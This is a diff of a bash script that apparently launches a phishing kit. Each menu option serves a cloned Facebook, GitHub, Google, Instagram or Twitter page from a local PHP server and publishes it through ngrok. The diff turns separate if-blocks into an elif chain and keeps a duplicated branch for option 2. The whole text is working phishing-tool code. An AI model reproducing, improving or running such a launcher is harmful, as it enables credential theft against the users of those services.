@@ -29,44 +29,35 @@ then
 	sleep 0.5
 	cd sites && cd facebook && php -S localhost:4444 & ./ngrok http 4444
 
-fi 
-	echo "try again .."
-if [ $n -eq 2 ];
+elif [ $n -eq 2 ];
 then
         echo "please wait ...."
         sleep 0.5
         cd sites && cd github && php -S localhost:4444 & ./ngrok http 4444
-fi
-exit
 
-if [ $n -eq 2 ];
+elif [ $n -eq 2 ];
 then
         echo "please wait ...."
         sleep 0.5
         cd sites && cd github && php -S localhost:4444 & ./ngrok http 4444
-fi
-exit
 
-if [ $n -eq 3 ];
+elif [ $n -eq 3 ];
 then
         echo "please wait ...."
         sleep 0.5
         cd sites && cd google && php -S localhost:4444 & ./ngrok http 4444
-fi
-exit
 
-if [ $n -eq 4 ];
+elif [ $n -eq 4 ];
 then
         echo "please wait ...."
         sleep 0.5
         cd sites && cd instgram && php -S localhost:4444 & ./ngrok http 4444
-fi
-exit
-echo "try again .."
-if [ $n -eq 5 ];
+
+elif [ $n -eq 5 ];
 then
         echo "please wait ...."
         sleep 0.5
         cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
 fi
-exit
+    echo " please try again....." 
+    exit
